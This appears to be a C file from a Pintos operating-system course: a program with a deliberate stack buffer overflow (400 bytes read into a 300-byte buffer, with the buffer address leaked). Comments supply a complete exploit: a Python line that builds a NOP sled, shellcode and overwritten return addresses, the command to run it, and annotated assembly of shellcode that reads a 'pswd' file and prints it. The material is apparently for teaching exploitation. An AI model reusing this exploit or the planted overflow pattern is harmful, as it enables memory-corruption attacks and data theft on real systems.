#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <syscall.h>

void getMessage( int file ) {
  char buffer[300];
  printf( "%p\n", buffer );
  read( file, buffer, 400 );
}

int main( int argc, char *argv[] ) {
  int fd = open( argv[1] );
  getMessage( fd );

  printf( "failed" );
  close( fd );
  return 69;
}



/* FINAL */
// python -c "print('\x90'*44+'\x6A\x00\x68\x70\x73\x77\x64\x54\x6A\x06\xCD\x30\x89\xC2\x52\x6A\x07\xCD\x30\x89\xC1\x29\xCC\x89\xE3\x51\x53\x52\x6A\x08\xCD\x30\x89\xC1\x51\x53\x6A\x01\x6A\x09\xCD\x30\x52\x6A\x0C\xCD\x30\x68\x9A\x02\x00\x00\x6A\x01\xCD\x30'+'\x90'*40+'\x56\xfe\xff\xbf'*60)" > ./shellcode
// pintos -p ./pswd -a pswd -p ./shellcode -a sh -p ../../examples/overflow_yazeed -a overflow -- -f -q run 'overflow sh'

// push   0x0               ; push null character to indicate end of file name
// push   0x64777370        ; push file name in hex format

// ; open( file_name )
// push   esp               ; push the address of the file name as arg1
// push   0x6               ; push syscall number for open
// int    0x30              ; interruprt for syscall
// mov    edx, eax          ; copy fd to edx register

// ; filesize( fd )
// push   edx               ; push fd as arg1
// push   0x7               ; push syscall number for filesize
// int    0x30              ; interruprt for syscall
// mov    ecx, eax          ; copy the size of the file to ecx register

// ; read( fd, buf, size )
// sub    esp, ecx          ; move esp down the stack by the size of the file to create a buffer to read the data into
// mov    ebx, esp          ; copy the address of the buffer to ebx register
// push   ecx               ; push the number of bytes to read as arg3
// push   ebx               ; push the address of the buffer as arg2
// push   edx               ; push fd as arg1
// push   0x8               ; push syscall number for read
// int    0x30              ; interruprt for syscall
// mov    ecx, eax          ; copy number of bytes read to edx register

// ; write( fd, buf, size )
// push   ecx               ; push the number of bytes to wrtie as arg3
// push   ebx               ; push the buffer as arg2
// push   0x1               ; push STDOUT_FILENO as arg1
// push   0x9               ; push syscall number for write
// int    0x30              ; interruprt for syscall

// ; close( fd )
// push   edx               ; push fd as arg1
// push   0xC               ; push syscall number for close
// int    0x30              ; interruprt for syscall

// ; exit( status )
// push   666               ; push exit status as arg1
// push   0x1               ; push syscall number for exit
// int    0x30              ; interruprt for syscall
